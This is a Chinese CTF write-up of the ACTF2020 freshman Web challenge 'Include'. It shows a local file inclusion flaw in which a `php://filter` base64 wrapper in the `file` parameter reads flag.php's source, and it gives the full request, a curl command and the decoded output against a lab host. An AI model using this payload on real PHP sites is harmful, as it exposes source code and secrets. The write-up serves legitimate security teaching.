---
title: ACTF2020 新生赛 - Web - Include
date: 2026-11-14 18:03:00
categories:
  - CTF
  - ACTF2020 新生赛
  - Web
tags:
  - 文件包含
  - php伪协议
  - php://filter
  - base64编码
cover: /img/cover/girl-wading-rainy-street.jpg
description: "文件包含基础题，file 参数直接用于包含且未过滤伪协议，flag 藏在 flag.php 注释中直接包含会被 PHP 执行掉，改用 php://filter 读 base64 源码再解码拿 flag。"
keywords:
  - 文件包含
  - LFI
  - php://filter
  - 源码读取
  - ACTF
ai: >-
  本题是 ACTF2020 新生赛的 Web 文件包含题，首页只给一个 ?file=flag.php 链接。直接包含时页面只回显 Can you find out the flag?，说明文件被 PHP 解析执行，而 flag 写在源码注释里不会显示。由于 file 参数未过滤伪协议，可改用 php://filter 的 base64 编码读取 flag.php，让 PHP 以原始字节流输出，绕过解析拿到源码。解码即可在注释中看到 flag。整题考察伪协议未过滤，以及理解 php://filter 能把被解析的 PHP 文件还原为可读源码，是 LFI 读源码的标准手法。
copyright_author: Hunter
---

> 结论先行：`file` 参数未过滤伪协议，`flag.php` 被直接包含会执行、看不到注释里的 flag；用 `php://filter` 读 base64 源码再解码即可。

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | ACTF2020 新生赛 |
| 方向 | Web |
| 难度 | Easy |
| 环境 | 授权靶场（已脱敏） |

漏洞类型：文件包含（LFI）+ `php://filter` 伪协议读取源码。

## 信息收集

访问首页，页面只有一个链接：

```html
<meta charset="utf8">
<a href="?file=flag.php">tips</a>
```

提示通过 `file` 参数包含文件，存在文件包含漏洞。

## 漏洞分析

`flag.php` 被 PHP 执行后只输出一行提示，flag 实际写在源码注释中，注释不会被执行显示。因此需要用伪协议把文件当作原始字节流读取，而非交给 PHP 引擎解析。

## 利用过程

### 1. 直接访问 flag.php

```text
GET /?file=flag.php
```

返回：

```text
Can you find out the flag?
```

说明 `flag.php` 被 PHP 执行了，flag 藏在源码注释里（执行后不显示）。

### 2. 使用 php://filter 读取源码

用 `php://filter` 伪协议 + base64 编码，让 PHP 以原始字节流形式读取文件，避免被解析执行：

```text
GET /?file=php://filter/read=convert.base64-encode/resource=flag.php
```

返回 base64 编码的源码：

```text
PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7eHh4eH0K
```

### 3. base64 解码

解码后得到 flag.php 源码：

```php
<?php
echo "Can you find out the flag?";
//flag{xxxx}
```

## 完整 EXP

```bash
# 1. 用 base64 伪协议读源码
curl "http://target:8080/?file=php://filter/read=convert.base64-encode/resource=flag.php"

# 2. 解码得到源码（含注释中的 flag）
echo 'PD9waHAKZWNobyAiQ2FuIHlvdSBmaW5kIG91dCB0aGUgZmxhZz8iOwovL2ZsYWd7eHh4eH0K' | base64 -d
```

## Flag

```text
flag{xxxx}
```

## 踩坑与总结

1. `file` 参数直接用于文件包含，未过滤伪协议。
2. flag 写在 flag.php 的注释里，直接包含会被 PHP 执行掉（不显示注释）。
3. 用 `php://filter/read=convert.base64-encode/resource=` 让 PHP 读取文件原始内容并 base64 编码输出，绕过 PHP 解析，从而看到源码中的 flag。
4. 遇到「包含后内容看不到」的文件，优先考虑用伪协议读源码而非直接包含。
